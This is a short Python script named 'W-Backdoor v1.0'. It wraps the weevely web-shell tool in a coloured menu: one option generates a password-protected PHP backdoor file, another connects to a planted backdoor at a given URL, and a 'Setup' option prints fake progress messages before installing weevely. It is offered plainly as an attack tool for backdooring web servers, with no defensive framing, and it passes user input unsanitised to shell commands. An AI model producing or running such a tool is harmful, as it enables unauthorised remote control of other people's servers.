#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import time

menu = """
\033[0;36m __      __         __________                __       .___                   
/  \    /  \        \______   \_____    ____ |  | __ __| _/____   ___________ 
\   \/\/   /  ______ |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ |
 \        /  /_____/ |    |   \ / __ \\  \___|    </ /_/ (  <_> |  <_> )  | \|
  \__/\  /           |______  /(____  /\___  >__|_ \____ |\____/ \____/|__|   
       \/                   \/      \/     \/     \/    \/                    
                                                    
            \033[0;35m    .::. \033[0;37mW-Backdoor v1.0 Coded By @wolkan \033[0;35m.::.
                     \033[0;31m[      Everything for you      ]
                
\033[0;31m[\033[0;33m1\033[0;31m]>\033[0;32m Backdoor-Generate
\033[0;31m[\033[0;33m2\033[0;31m]>\033[0;32m Backdoor-Connect
\033[0;31m[\033[0;33m3\033[0;31m]>\033[0;32m Setup
\033[0;31m[\033[0;33mh\033[0;31m]>\033[0;32m Help
\033[0;31m[\033[0;33me\033[0;31m]>\033[0;32m Exit
"""
os.system("clear")
print(menu)

while True:
    choice = input("\033[0;31m\033[1m[\033[0;36m\033[1mw-backdoor\033[0;31m\033[1m]>\033[1m\033[0;32m ")

    if (choice == '1'):
        name = input("Name: ")
        passwd = input("Password: ")
        output = input("Output: ")
        os.system("weevely generate {} {}{}.php".format(passwd,output,name))
        print("\033[0;34m\033[1m[+]\033[0m \033[0;32mSuccessfully created\n")
    
    elif (choice == '2'):
        url = input("Url: ")
        os.system("weevely {}".format(url))

    elif (choice == '3'):
        time.sleep(4)
        print("\033[0;34m\033[1m[+]\033[0m \033[0;32mPreparing files")
        time.sleep(3)
        print("\033[0;34m\033[1m[+]\033[0m \033[0;32mMaking final preparations")
        time.sleep(2)
        print("\033[0;34m\033[1m[+]\033[0m \033[0;32mDownloading files")
        time.sleep(2)
        os.system("apt install weevely")
        print("\033[0;34m\033[1m[+]\033[0m \033[0;32mFiles downloaded successfully\n")

    elif (choice == 'h' or choice == 'help'):
        print("""W-Backdoor 1.0 ( https://github.com/wolk4n )
Usage: python w-backdoor.py, choose one of the options in the main menu and follow the steps the program says.
COMMANDS:
    e [exit]: Exits the program.
    h [help]: Prints this help page.
    version: Shows the version of the program.
    clear: Clears the screen.
    menu: Shows the main menu.
""")

    elif (choice == 'clear'):
        os.system("clear")

    elif (choice == 'menu'):
        print(menu)
    
    elif (choice == 'version'):
        print("W-Backdoor V1.0  (https://github.com/wolk4n)\n")

    elif (choice == 'e' or choice == 'exit'):
        break